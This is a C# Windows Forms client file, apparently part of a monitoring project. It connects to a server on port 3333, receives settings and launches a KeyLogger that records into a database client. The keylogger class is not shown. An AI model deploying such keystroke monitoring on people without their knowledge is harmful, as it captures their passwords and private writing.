
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace ClientSide
{
    public partial class ClientForm : Form
    {
        private String clientName = "";
        private Socket clientSocket;
        private byte[] buffer;// Holds our connection with the database
        public DBclient dbs;
        public String DB = "";
        public string settingString = "";
        public setSetting set;
        public ClientForm()
        {
            InitializeComponent();
        }
        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        // The function is activated as soon as data is received in the socket
        private void ReceiveCallback(IAsyncResult AR)
        {
            try
            {
                int received = clientSocket.EndReceive(AR);
                if (received == 0)
                {
                    return;
                }
                string setting = Encoding.ASCII.GetString(buffer);
                ShowErrorDialog(setting);
                playMonitor(setting);//This method obtains the settings string from the server
                // Start receiving data again.
                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, null);
            }
            // Avoid Pokemon exception handling in cases like these.
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }

        // set setting and here will play all triggers;
        private void playMonitor(string setting)
        {
            //set setting 
            set = new setSetting(setting);

            // play key logger
            KeyLogger k = new KeyLogger(dbs, set);
            //here will play all triggers;
        }

        // Defines functions for sending and receiving data through the socket
        private void ConnectCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket.EndConnect(AR);
                UpdateControlStates(true);
                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, null);
                dbs = new DBclient(clientName);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }
        // A method that sends information to a server
        private void SendCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket.EndSend(AR);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }
        /// A thread safe way to enable the send button.
        private void UpdateControlStates(bool toggle)
        {
            Invoke((Action)delegate
            {
               
                buttonConnect.Enabled = !toggle;
                labelIP.Visible = textBoxAddress.Visible = !toggle;
            });
        }
        // Functions that help test
      /*  private void buttonSend_Click(object sender, EventArgs e)
        {
            try
            {
                String msg = txbMsg.Text;
                txbMsg.Text = "";
                var sendData = Encoding.ASCII.GetBytes(msg);
                clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, null);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
                // UpdateControlStates(false);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
                // UpdateControlStates(false);
            }
        }
        */
        // A method called when the client connects to the server
        // The customer begins to be monitored
       
        private void ClientForm_Load(object sender, EventArgs e)
        {

        }

        private void buttonConnect_Click(object sender, EventArgs e)
        {
            try
            {
                if (txbName.TextLength == 0)
                {
                    ShowErrorDialog("Must fill Client Name");
                }
                else
                {
                    ShowErrorDialog(txbName.Text);
                    clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    // Connect to the specified host.
                    var endPoint = new IPEndPoint(IPAddress.Parse(textBoxAddress.Text), 3333);
                    clientSocket.BeginConnect(endPoint, ConnectCallback, null);
                    // send ClientName
                    var sendData = Encoding.ASCII.GetBytes(txbName.Text);
                    clientName = txbName.Text;
                    ShowErrorDialog(txbName.Text);
                    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, null);
                    


                }

            }
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }
    }  
}

